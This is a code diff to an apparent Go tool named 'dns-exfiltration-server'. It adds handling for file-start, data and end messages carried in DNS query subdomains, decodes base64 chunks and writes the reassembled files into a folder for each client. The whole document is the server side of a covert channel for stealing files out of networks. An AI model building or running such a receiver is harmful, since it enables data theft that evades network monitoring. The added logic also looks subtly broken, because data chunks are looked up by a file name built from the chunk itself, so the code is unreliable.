@@ -2,9 +2,12 @@ package exfiltrator
 
 import (
 	"dns-exfiltration-server/fileutils"
+	"encoding/base64"
 	"fmt"
 	"log"
 	"net"
+	"os"
+	"path"
 	"strings"
 
 	"github.com/miekg/dns"
@@ -19,7 +22,8 @@ const (
 )
 
 type dnsExfiltrator struct {
-	NameServer string
+	nameServer string
+	openFiles  map[string]map[string]*os.File
 }
 
 func NewDnsExfiltrator(nameServer string) *dnsExfiltrator {
@@ -31,8 +35,18 @@ func NewDnsExfiltrator(nameServer string) *dnsExfiltrator {
 	fileutils.CreateDirIfNotExists(EXFILTRATION_DIR)
 
 	return &dnsExfiltrator{
-		NameServer: absoluteNameServer,
+		nameServer: absoluteNameServer,
+		openFiles:  make(map[string]map[string]*os.File),
 	}
+}
+
+func decodeFromModifiedBase64(modifiedBase64Data string) []byte {
+	base64Data := strings.Replace(modifiedBase64Data, "-", "=", -1)
+	data, err := base64.URLEncoding.DecodeString(base64Data)
+	if err != nil {
+		log.Fatalln(err)
+	}
+	return data
 }
 
 func (ex *dnsExfiltrator) HandleDnsRequests(udpServer *net.UDPConn, nameServer string) {
@@ -47,8 +61,41 @@ func (ex *dnsExfiltrator) HandleDnsRequests(udpServer *net.UDPConn, nameServer s
 		request.Unpack(buf)
 		name := request.Question[0].Name
 		subdomains := strings.Split(name, nameServer)[0]
-		data := strings.ReplaceAll(subdomains, ".", "")
-		fmt.Println(data)
+		msgType, msg := func() (string, string) {
+			x := strings.SplitN(subdomains, ".", 2)
+			return x[0], x[1]
+		}()
+		data := strings.ReplaceAll(msg, ".", "")
+
+		clientDir := path.Join(EXFILTRATION_DIR, clientAddr.String())
+		filename := path.Join(clientDir, data)
+
+		// Initialise the inner map if uninitialised.
+		if _, ok := ex.openFiles[clientAddr.String()]; !ok {
+			ex.openFiles[clientAddr.String()] = make(map[string]*os.File)
+		}
+
+		switch msgType {
+		case DNS_FILE_START.String():
+			fileutils.CreateDirIfNotExists(clientDir)
+			file := fileutils.CreateFileIfNotExists(filename)
+			ex.openFiles[clientAddr.String()][filename] = file
+		case DNS_FILE_END.String():
+			file := ex.openFiles[clientAddr.String()][filename]
+			err = file.Close()
+			if err != nil {
+				log.Fatalln(err)
+			}
+		case DNS_FILE_DATA.String():
+			file := ex.openFiles[clientAddr.String()][filename]
+			decodedData := decodeFromModifiedBase64(data)
+			_, err := file.Write(decodedData)
+			if err != nil {
+				log.Fatalln(err)
+			}
+		default:
+			log.Printf("Unknown message type: '%s'", msgType)
+		}
 
 		var reply dns.Msg
 		reply.SetReply(&request)
